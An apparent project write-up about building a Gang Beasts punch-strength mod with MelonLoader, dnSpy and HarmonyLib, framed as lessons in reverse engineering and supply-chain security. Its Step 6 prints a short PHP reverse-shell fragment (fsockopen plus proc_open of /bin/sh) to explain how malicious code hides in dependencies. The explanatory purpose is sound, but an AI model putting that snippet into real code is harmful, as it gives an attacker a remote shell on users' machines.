# The Journey — How We Built This Mod (And What It Taught Us About Security)

## The Goal
We wanted to make our character punch friends really far in Gang Beasts.
Simple goal. Harder than expected. And surprisingly educational.

## Step 1: Wrong Tool — BepInEx
First instinct was to use BepInEx, the most popular Unity mod loader.
Extracted it to the game folder, launched the game... nothing happened.
No LogOutput.log created. Complete silence.

After debugging doorstop configs, proxy DLLs, and admin permissions,
we discovered the real problem:

**Gang Beasts uses IL2CPP, not Mono.**
BepInEx 5 does not support IL2CPP.

Lesson learned: Check which runtime the game uses BEFORE installing anything.

## Step 2: BepInEx 6 IL2CPP
Switched to BepInEx 6 pre-release which supports IL2CPP.
First launch generated interop assemblies — progress!

But `FindObjectsOfType<Rigidbody>()` returned 0 results.
The MonoBehaviour wasn't attached to any scene properly.

## Step 3: Wrong Mod Loader
After hours of debugging Harmony patches, virtual methods, and IL2CPP interop...
we found this:

> "Modding Gang Beasts typically utilizes MelonLoader rather than BepInEx"

**We were using the wrong tool the entire time.**

The real lesson: 5 minutes of Google before hours of code.
In pentesting this is called skipping enumeration — and it costs you the same way.

## Step 4: MelonLoader
Switched to MelonLoader. First launch worked immediately.
`FindObjectsOfType` returned results. The mod loaded.

But now a new problem: how do we identify ONLY the local player?

## Step 5: Reverse Engineering with dnSpy
Used dnSpy to decompile the IL2CPP interop assemblies and explore:
- `Femur.Actor` — the main player class
- `Femur.MovementHandeler` — movement logic
- `Femur.ControlHandeler` — input and actions
- `GameplayModifiers` — global game modifiers

We found punch-related fields: `_punchForceModifer`, `_punchDamageModifer`
But couldn't figure out how to identify the local player vs bots.

This process — loading a binary, exploring its structure, finding interesting 
fields and methods — is identical to what security researchers do with 
malware samples and proprietary software every day.
The tool changes (Ghidra, IDA Pro instead of dnSpy), but the mindset is the same.

## Step 6: The Security Insight — Supply Chain Attack
While browsing through hundreds of lines of decompiled code, we realized something:

**It would be trivially easy to hide malicious code in here.**

We downloaded multiple DLLs from GitHub and NuGet during this project —
BepInEx, MelonLoader, HarmonyLib, IL2CppInterop — without reading their source.
Any one of them could have contained something like this:

```php
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
```

This is a PHP reverse shell — it opens a connection back to an attacker
and gives them a shell on your machine. Hidden in 500 lines of legitimate code,
nobody would notice.

This is called a **Supply Chain Attack** — and it happens in the real world.
Notable examples: SolarWinds, XZ Utils, event-stream npm package.

The lesson: always check what you're downloading, especially DLL files.

## Step 7: Reading Open Source Code
Found [OnePunchGB](https://thunderstore.io/c/gang-beasts/p/Zooks/OnePunchGB/) 
on Thunderstore. Read their decompiled source and discovered:

**The key insight:** Use `Traverse` from HarmonyLib to access IL2CPP properties
at runtime. Check `_controlledBy` property on the `Actor` class:
- `"ai"`, `"cpu"`, `"bot"` = not local player
- `"human"`, `"player"`, `"local"` = local player ✅

## Step 8: It Works!
Final implementation polls for actors every second,
identifies the local player, and buffs their stats.

## Key Lessons

### Technical
1. **IL2CPP vs Mono** — two very different Unity runtimes with different mod loaders
2. **Traverse** — the correct way to access IL2CPP properties at runtime
3. **DLL Injection** — what we did is essentially the same technique used in security research
4. **Reverse Engineering** — dnSpy for .NET is like Ghidra for native binaries

### Security
5. **Reconnaissance first** — skipping enumeration wastes hours, in modding AND in pentesting
6. **Supply Chain Attacks** — every dependency you add is a potential attack vector
7. **Code Review** — always read what you're importing, especially binary files
8. **Runtime Manipulation** — Harmony patches = function hooking = a core malware technique

## The Real Takeaway
What started as "I want to punch my friend really far in Gang Beasts"
turned into a practical lesson in:
- DLL injection
- IL2CPP reverse engineering  
- Runtime function hooking
- Supply chain security
- The importance of reconnaissance

The techniques are the same. Only the target changes.

## Technical Stack
- MelonLoader v0.7.3
- HarmonyLib (Traverse)
- dnSpy (reverse engineering)
- .NET Standard 2.1 / C#
- Visual Studio 2026
